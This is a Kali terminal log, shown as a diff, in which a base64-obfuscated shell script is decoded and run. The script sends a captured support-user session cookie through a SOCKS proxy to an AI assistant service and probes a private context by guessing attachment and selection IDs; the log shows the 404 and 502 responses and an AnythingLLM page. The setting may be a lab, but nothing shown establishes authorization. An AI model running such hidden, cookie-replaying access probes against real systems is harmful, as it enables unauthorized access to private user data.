@@ -1,0 +1,54 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k223.sh <<'B64EOF'
+> c2V0ICtlClA9Ii0tc29ja3M1LWhvc3RuYW1lIDEyNy4wLjAuMToxMDgwIjsgSz0iLWsgLXNTIC1tIDkwIjsgSD0iaHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QiCkM9IkNvb2tpZTogZmllbGRrZXN0X3N1cHBvcnQ9Zmtfc3VwcG9ydF9yb3dhbl8yZnh0WE5rVWpLTWJjdlBCbEFvdDBKcDB2Vk5wcEw5YiIKZWNobyAiPT0gYW5zd2VycyBlbXB0eSAoY29va2llKSIKY3VybCAkSyAkUCAtSCAiJEMiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEgvYXBpL2Fuc3dlcnMiIC13ICJcblsle2h0dHBfY29kZX1dXG4iCmVjaG8gIj09IGFuc3dlcnMgbW9kZSBxdWVyeSBzZWxlY3Rpb24gKGNvb2tpZSkiCmN1cmwgJEsgJFAgLUggIiRDIiAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7ImNvbnRleHRfaWQiOiJjdHgtc3VwcG9ydC1wcml2YXRlLXY0IiwibW9kZSI6InF1ZXJ5Iiwic2VsZWN0aW9uX2lkIjoiU0VMLVNVUC0yODQxLTEyIn0nICIkSC9hcGkvYW5zd2VycyIgLXcgIlxuWyV7aHR0cF9jb2RlfV1cbiIKZWNobyAiPT0gYXR0YWNobWVudCBndWVzc2VzIgpmb3IgdSBpbiBcCiAiL2FwaS9hdHRhY2htZW50cy9BVFQtRElBRy02OTgiIFwKICIvYXBpL2NvbnRleHRzL2N0eC1zdXBwb3J0LXByaXZhdGUtdjQvYXR0YWNobWVudHMvQVRULURJQUctNjk4IiBcCiAiL2FwaS9jb250ZXh0cy9jdHgtc3VwcG9ydC1wcml2YXRlLXY0L3NlbGVjdGlvbnMvU0VMLVNVUC0yODQxLTEyIiBcCiAiL2FwaS9jb250ZXh0cy9jdHgtc3VwcG9ydC1wcml2YXRlLXY0L2RvY3VtZW50cy9BVFQtRElBRy02OTgiIDsgZG8KIGVjaG8gIiMjIyMgJHUiCiBjdXJsICRLICRQIC1IICIkQyIgIiRIJHUiIC13ICJcblsle2h0dHBfY29kZX1dXG4iIHwgaGVhZCAtYyAxMjAwOyBlY2hvCmRvbmUKZWNobyBET05FCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k223.sh; bash /tmp/k223.sh; echo DONEMARK_1795211573150$((6*7))
+== answers empty (cookie)
+{"error":"context_not_found"}
+
+[404]
+== answers mode query selection (cookie)
+{"error":"retrieval_failed"}
+
+[502]
+== attachment guesses
+#### /api/attachments/ATT-DIAG-698
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal 
+#### /api/contexts/ctx-support-private-v4/attachments/ATT-DIAG-698
+{"error":"not_found"}
+
+[404]
+
+#### /api/contexts/ctx-support-private-v4/selections/SEL-SUP-2841-12
+{"error":"not_found"}
+
+[404]
+
+#### /api/contexts/ctx-support-private-v4/documents/ATT-DIAG-698
+{"error":"not_found"}
+
+[404]
+
+DONE
